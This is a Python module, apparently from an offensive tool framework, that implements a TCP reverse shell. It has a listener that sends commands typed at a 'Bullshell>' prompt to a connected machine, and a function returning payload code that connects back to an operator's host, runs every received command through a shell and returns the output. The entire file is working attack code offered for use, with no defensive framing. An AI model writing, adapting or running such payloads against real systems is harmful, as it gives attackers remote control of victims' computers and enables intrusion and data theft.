
#basic module description
def description() -> str:
    return "TCP reverse shell"

#basic module rank
def rank() -> str:
    return "Good"

#basic module date
def date() -> str:
    return "18.04.2026"

#set arguments
def depargs() -> dict:
    return {
        "host": "IPv4 addr",
        "port": "Port"
    }

#imports
from StrFuncs import err, evnt, datetime
import socket, os
from colorama import Fore, Style

#main function
def main(ip: str, port: int) -> None:
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(1)
        print(f"{evnt()} Listening for incoming connection...")
        conn, addr = s.accept()
        print(f"{evnt()} Connection established from: {addr}")
        while True:
            command = input(f"{Fore.RED}Bullshell>{Style.RESET_ALL}")
            if not command: continue
            
            conn.send(command.encode())
            print(conn.recv(1024 * 1024 * 10).decode(errors="ignore"))
    except Exception as error:
        print(f"{err()} {error}")
    finally:
        s.close()

#launch func
def launch(args: dict) -> None:
    ip = args.get("host", "127.0.0.1")
    port = int(args.get("port", 8888))
    main(ip, port)



#source code (only for payloads)
def code(rhost: str, rport: int):
    return """
import socket
import subprocess
import os
lhost = "{rhost}"
lport = {rport}
def connect():
    try:
        s = socket.socket()
        s.connect((lhost, lport))
        while True:
            data = s.recv(1024)
            command = data.decode("utf-8")
            if command.strip() == "kill":
                break
            elif command.startswith("cd "):
                try:
                    path = data.decode("utf-8")[3:]
                    os.chdir(path)
                    s.send(f" Changed directory to {os.getcwd()}".encode())
                except Exception as l:
                    s.send(str(l).encode())
            elif len(data) > 0:
                proc = subprocess.Popen(data.decode("utf-8"), shell=True, 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                        stdin=subprocess.PIPE)
                stdout = proc.stdout.read() + proc.stderr.read()
                s.send(stdout)
                if not stdout:
                    s.send(b"Ok")
    except Exception as err:
        print(err)
    finally:
        s.close()
if __name__ == "__main__":
    connect()
"""
